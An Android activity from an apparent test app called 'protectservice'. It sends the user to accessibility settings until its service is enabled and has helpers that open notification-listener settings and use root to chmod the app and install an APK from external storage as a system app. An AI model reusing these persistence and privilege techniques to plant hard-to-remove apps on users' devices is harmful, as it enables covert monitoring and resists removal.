package com.test.sun.protectservice;

import android.Manifest;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Environment;
import android.provider.Settings;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.accessibility.AccessibilityManager;


import com.test.sun.protectservice.utils.SysApp;

import java.io.File;
import java.util.List;

public class MainActivity extends AppCompatActivity {

    public static final String TAG = "TestVar";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        checkAccessibility();


    }

    private void checkAccessibility() {
        boolean permitted = false;
        AccessibilityManager am = (AccessibilityManager) getSystemService(Context.ACCESSIBILITY_SERVICE);
        List<AccessibilityServiceInfo> installedAccessibilityServiceList = am.getInstalledAccessibilityServiceList();

        List<AccessibilityServiceInfo> enabledAccessibilityServiceList = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_GENERIC);
        for (AccessibilityServiceInfo info : enabledAccessibilityServiceList) {
            if (info.getId().lastIndexOf("com.test.sun.protectservice") > -1) {
                permitted = true;
            }
        }
        if (!permitted) {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        }
    }

    private void nls() {
        try {
            Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
            startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void root() {
        String command = "chmod 777 " + getPackageCodePath();
        boolean b = SysApp.RootCommand(command);
        if (b) {
            Log.i(TAG, "RootCommand:true");
            File file = new File(Environment.getExternalStorageDirectory().getAbsolutePath() + "/ddkj/ddkj.apk");
            if (file.exists()) {
                Log.i(TAG, "file:true");
                boolean b1 = SysApp.writeToSystemApp(file);
//                boolean b1 = SysApp.delFromSystemApp(file);
                Log.i(TAG, "file:" + b1);
            }
        }
    }
}
